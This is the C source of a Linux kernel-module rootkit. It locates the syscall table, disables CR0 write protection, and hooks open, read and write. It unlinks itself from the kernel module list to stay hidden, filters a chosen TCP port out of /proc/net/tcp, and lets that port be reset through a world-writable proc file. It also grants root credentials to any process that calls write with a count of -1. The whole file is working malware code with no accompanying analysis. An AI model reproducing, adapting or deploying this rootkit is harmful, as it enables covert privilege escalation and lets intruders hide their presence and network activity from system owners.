#define _GNU_SOURCE
#include <asm/cacheflush.h>
#include <asm/current.h>
#include <asm/page.h>
#include <asm/uaccess.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/stat.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/unistd.h>

MODULE_LICENSE("GPL");

#define BUF_SIZE 1024
#define END_MEM  ULLONG_MAX
#define START_MEM   PAGE_OFFSET
#define TCP_LINE_SIZE 150
#define END_MEM     ULLONG_MAX
#define PROC_FILE_NAME "rootkitproc"

int PORT_TO_HIDE = 631;
int TCP_fd = -10;
static struct proc_dir_entry *proc_file;
static unsigned long procfs_buffer_size = 0;
struct list_head *prev_module;
unsigned long long *syscall_table;


asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
asmlinkage int (*modified_write)(unsigned int, const char __user *, size_t);

// original functions
asmlinkage int (*original_open)(const char *, int);
asmlinkage long (*original_read)(int, char __user *, size_t);

// hijacked open function
asmlinkage int new_open(const char* path_name, int flags) {
  // sets the hijack flag indicating that we should hide the TCP port
  if (strstr(path_name, "tcp") != NULL && strstr(path_name, "tcp6") == NULL) {
    printk("path name is: %s \n", path_name);
    TCP_fd = (*original_open)(path_name, flags);
    return TCP_fd;
  }
  return (*original_open)(path_name, flags);
}

// hijacked read function
asmlinkage long new_read(int fd, char __user *buf, size_t count) {
  long ret, temp;
  long i = 0;
  char * kernel_buf;
  ret = original_read(fd, buf, count);
  if (fd != TCP_fd)
    return ret;
  kernel_buf = kmalloc(count, GFP_KERNEL);
  // Kernel Problem
  if (!kernel_buf || copy_from_user(kernel_buf, buf, count)) {
    printk("FAILLLLLLED KERNEL PROBLEM");
    return ret;
  }
  // ignoring the first line of the file
  i += TCP_LINE_SIZE;

  for (; i < ret; i = i + TCP_LINE_SIZE) {
    int j = 0;
    int val = 0;
    for (; j < 4; j++) {
      if (kernel_buf[i + 15 + j] <= 57)
        val = val + (kernel_buf[i + 15 + j] - 48) * (1 << (4 * (3 - j)));
      else
        val = val + (kernel_buf[i + 15 + j] - 55) * (1 << (4 * (3 - j)));
    }
    if (val != PORT_TO_HIDE)
      continue;
    temp = i;
    for (; temp < ret - TCP_LINE_SIZE; temp++) {
      kernel_buf[temp] = kernel_buf[temp + TCP_LINE_SIZE];
    }
    for (temp = ret - (TCP_LINE_SIZE + 1); temp < ret; temp++) {
      kernel_buf[temp] = '\0';
    }
    count = count - TCP_LINE_SIZE;
  }
  // Kernel Problem
  if (copy_to_user(buf, kernel_buf, count)) {
    printk("FAILLLLLLED KERNEL PROBLEM");
  }
  kfree(kernel_buf);
  return ret;
}

/*                           PROC FILE FUNCTIONS                       */
int procfile_read(char *buffer, char **buffer_location, off_t offset, int buffer_length, int *eof, void *data) {
  printk("DONT YOU EVER TRY TO READ THIS FILE OR I AM GOING TO DESTROY YOUR MOST SECRET DREAMS");
  return 0;
}

int procfile_write(struct file *file, const char *buf, unsigned long count, void *data) {
  printk("writing to the proc file\n");
  char * kernel_buf = kmalloc(count, GFP_KERNEL);
  bool temp = 0;
  unsigned long j = 0;
  int c;
  if (!kernel_buf || copy_from_user(kernel_buf, buf, count)) {
    printk("FAILLLLLLED KERNEL PROBLEM\n");
    return count;
  }
  // hp port number decimal value
  if (kernel_buf[0] == 'h' &&  kernel_buf[1] == 'p') {
    PORT_TO_HIDE = 0;
    for (j = 3; j < count ; j++) {
      c = kernel_buf[j] - '0';
      if (c >= 0 && c <= 9)
        temp = true;
      if (!temp)
        break;
      PORT_TO_HIDE =  PORT_TO_HIDE * 10;
      PORT_TO_HIDE = PORT_TO_HIDE + c;
      temp = false;
    }
  }
  printk("NEW TO HIDE IS: %d\n ", PORT_TO_HIDE);
  printk("finished writing to the proc file\n");
  return count;
}

static const struct file_operations proc_file_fops = {
  .owner = THIS_MODULE,
  .read = procfile_read,
  .write = procfile_write,
};

/*                         END OF PROCFILE FUNCTIONS                     */

unsigned long **find(void) {
  unsigned long **sctable;
  unsigned long int i = START_MEM;
  while ( i < END_MEM) {
    sctable = (unsigned long **)i;
    if ( sctable[__NR_close] == (unsigned long *) sys_close) {
      return &sctable[0];
    }
    i += sizeof(void *);
  }
  return NULL;
}

void disable_write_protection(void) {
  write_cr0 (read_cr0 () & (~ 0x10000));
  return;
}

void hide_module(void) {
  prev_module = THIS_MODULE->list.prev;

  mutex_lock(&module_mutex);

  list_del_rcu(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del_rcu(&THIS_MODULE->mkobj.kobj.entry);

  synchronize_rcu();

  kfree(THIS_MODULE->notes_attrs);
  THIS_MODULE->notes_attrs = NULL;
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
  kfree(THIS_MODULE->mkobj.mp);
  THIS_MODULE->mkobj.mp = NULL;
  THIS_MODULE->modinfo_attrs->attr.name = NULL;
  kfree(THIS_MODULE->mkobj.drivers_dir);
  THIS_MODULE->mkobj.drivers_dir = NULL;

  mutex_unlock(&module_mutex);
}

void show_module(void) {
  mutex_lock(&module_mutex);
  list_add_rcu(&THIS_MODULE->list, prev_module);
  synchronize_rcu();
  mutex_unlock(&module_mutex);
}

void enable_write_protection(void) {
  write_cr0 (read_cr0 () | 0x10000);
  return;
}

// the method that gives the process root privileges
void set_root(void) {
  struct user_namespace *ns = current_user_ns();
  struct cred *new_cred;

  kuid_t kuid = make_kuid(ns, 0);
  kgid_t kgid = make_kgid(ns, 0);
  kuid_t rootUid;

  if(!uid_valid(kuid)) {
    printk("Not Valid..\n");
  }

  rootUid.val = 0;

  new_cred = prepare_creds();

  if(new_cred  != NULL) {
    if(!uid_eq(new_cred ->uid, rootUid)){
      printk("\nProcess is not root\n");
    } else {
      printk("\nProcess is already root\n");
    }

    new_cred ->uid = kuid;
    new_cred ->gid = kgid;
    new_cred ->euid = kuid;
    new_cred ->egid = kgid;
    new_cred ->suid = kuid;
    new_cred ->sgid = kgid;
    new_cred ->fsuid = kuid;
    new_cred ->fsgid = kgid;

    commit_creds(new_cred );

    if(uid_eq(new_cred ->uid, rootUid)){
      printk("\nProcess is now root\n");
    } else {
      printk("\nProcess is not root\n");
    }
  } else {
    abort_creds(new_cred );
    printk("Cannot get credentials of running process");
  }
}

// the new modified write function that will call the method that gives root access.
asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) {

  // printk(KERN_ALERT "WRITE HIJACKED");
  if(count == -1){
    set_root();
    return -1;
  }  
  return (*original_write)(fd, buf, count);
}

// the method that hijack the write syscall
void hijack_write_syscall(void) {

  printk(KERN_ALERT "\nHIJACK INIT\n");

  disable_write_protection();

  original_write = (void *)syscall_table[__NR_write];
  printk("\n before write hijacking: %d\n", original_write);

  syscall_table[__NR_write] = new_write; 
  modified_write = (void *)syscall_table[__NR_write];
  printk("\n after write hijacking %d\n", modified_write);

  enable_write_protection();
}

// the method that restore the original write syscall
void restore_hijacked_write_syscall(void) {

  disable_write_protection();
  syscall_table[__NR_write] = original_write; 
  enable_write_protection(); 
  printk("\nHijacked write Syscall is Restored\n");

}

static int init(void) {
  hide_module();
  printk("\nModule starting...\n");
  syscall_table = (unsigned long long*) find();
  if ( syscall_table != NULL ) {
    printk("Syscall table found at %llx\n", (unsigned long long) syscall_table);
  } else {
    printk("Syscall table not found!\n");
  }

  hijack_write_syscall();

  original_read = (void *)syscall_table[__NR_read];
  original_open = (void *)syscall_table[__NR_open];
  disable_write_protection();
  syscall_table[__NR_open] = new_open;
  syscall_table[__NR_read] = new_read;
  enable_write_protection();

  proc_file = proc_create( PROC_FILE_NAME, 0666, NULL, &proc_file_fops);
  if (proc_file == NULL) {
    remove_proc_entry(PROC_FILE_NAME, NULL);
    printk("ERROR ALLOCATING FILE");
    return -ENOMEM;
  }
  printk("proc file created\n");

  return 0;
}

static void exit_(void) {
  disable_write_protection();
  syscall_table[__NR_open] = original_open;
  syscall_table[__NR_read] = original_read;
  enable_write_protection();
  printk("Module ending\n");
  remove_proc_entry(PROC_FILE_NAME, NULL);
  restore_hijacked_write_syscall();
  return;
}

module_init(init);
module_exit(exit_);
